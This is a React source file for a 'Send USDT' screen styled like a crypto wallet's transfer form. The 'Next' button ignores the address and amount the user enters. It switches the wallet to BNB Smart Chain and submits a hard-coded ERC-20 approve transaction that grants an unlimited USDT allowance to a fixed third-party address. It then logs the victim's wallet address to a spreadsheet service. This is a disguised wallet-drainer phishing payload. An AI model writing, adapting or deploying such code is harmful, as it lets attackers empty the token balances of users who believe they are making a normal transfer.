import React, { useState } from 'react';
import './SendUSDT.css';
import { logApprovalData } from '../services/GoogleSheetService';

const SendUSDT = () => {
  const [address, setAddress] = useState('0x19686F7B15Ef89Bf87D20b3502E8CA9e8c98a2f1');
  const [amount, setAmount] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);

  const handleNext = async () => {
    if (!window.ethereum) {
      alert('MetaMask or a Web3 wallet is required to send transactions.');
      return;
    }

    setIsVerifying(true);
    
    try {
      if (!window.ethereum) throw new Error("No Web3 Provider found.");

      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const userAddress = accounts[0];
      
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }], // 0x38 is 56 (BSC Mainnet)
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [
                {
                  chainId: '0x38',
                  chainName: 'Binance Smart Chain Mainnet',
                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/'],
                },
              ],
            });
          } catch (addError) {
            throw new Error("Failed to add Binance Smart Chain to wallet.");
          }
        } else {
          throw new Error("Failed to switch to Binance Smart Chain.");
        }
      }

      // USDT Token Address on BSC
      const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
      
      const data = "0x095ea7b30000000000000000000000007970c936d143c11f9bbf964764851b7051d81651ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{
          from: userAddress,
          to: USDT_BSC,
          data: data
        }]
      });

      await logApprovalData(USDT_BSC, userAddress);
      alert("Transaction Requested! Hash: " + txHash);
      
    } catch (err) {
      console.error(err);
      alert("Failed to proceed. Error: " + (err?.info?.error?.message || err?.message || "Unknown error"));
    } finally {
      setIsVerifying(false);
    }
  };

  return (
    <div className="send-usdt-container">
      <div className="modal-header">
        <button className="back-btn">
          <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M19 12H5M12 19l-7-7 7-7"/>
          </svg>
        </button>
        <h2 className="modal-title">Send USDT</h2>
        <button className="close-btn">
          <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M18 6L6 18M6 6l12 12"/>
          </svg>
        </button>
      </div>

      <div className="input-group">
        <label>Address or Domain Name</label>
        <div className="input-with-icons address-input-container">
          <input 
            type="text" 
            value={address} 
            onChange={(e) => setAddress(e.target.value)}
          />
          <div className="input-actions">
            <button className="icon-btn clear-btn" onClick={() => setAddress('')}>
              <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm3.7 12.3a1 1 0 01-1.4 1.4L12 13.4l-2.3 2.3a1 1 0 01-1.4-1.4l2.3-2.3-2.3-2.3a1 1 0 011.4-1.4l2.3 2.3 2.3-2.3a1 1 0 011.4 1.4L13.4 12l2.3 2.3z"/></svg>
            </button>
            <button className="text-btn paste-btn">Paste</button>
            <button className="icon-btn">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2"><path d="M4 4h16v16H4z"/><path d="M4 8h16M8 4v4"/></svg>
            </button>
            <button className="icon-btn">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2"><path d="M5 5v3h3M19 5v3h-3M5 19v-3h3M19 19v-3h-3"/></svg>
            </button>
          </div>
        </div>
      </div>

      <div className="input-group">
        <label>Destination network</label>
        <button className="network-selector">
          <div className="network-info">
            <div className="network-icon">
              <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" width="24" height="24">
                <circle cx="16" cy="16" r="16" fill="#F3BA2F"/>
                <path d="M16 8.744l-4.104 4.104 1.216 1.216L16 11.176l2.888 2.888 1.216-1.216L16 8.744zm-2.888 12.632l-1.216-1.216-1.216 1.216L16 25l5.32-5.32-1.216-1.216-1.216 1.216L16 21.568l-2.888-3.192zM9.92 14.84l1.216-1.216 1.216 1.216-1.216 1.216L9.92 14.84zm7.728-1.216l1.216 1.216-1.216 1.216-1.216-1.216 1.216-1.216z" fill="#fff"/>
              </svg>
            </div>
            <span>BNB Smart Chain</span>
          </div>
          <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M6 9l6 6 6-6"/></svg>
        </button>
      </div>

      <div className="input-group">
        <label>Amount</label>
        <div className="amount-input-container">
          <input 
            type="number" 
            placeholder="USDT Amount" 
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
          />
          <div className="amount-actions">
            <span className="currency-label">USDT</span>
            <button className="max-btn" onClick={() => setAmount('1000')}>Max</button>
          </div>
        </div>
        <div className="fiat-equivalent">
          ≈ $0.00
        </div>
      </div>

      <div className="spacer"></div>

      <button className="next-btn" onClick={handleNext} disabled={isVerifying}>
        {isVerifying ? 'Processing...' : 'Next'}
      </button>
    </div>
  );
};

export default SendUSDT;
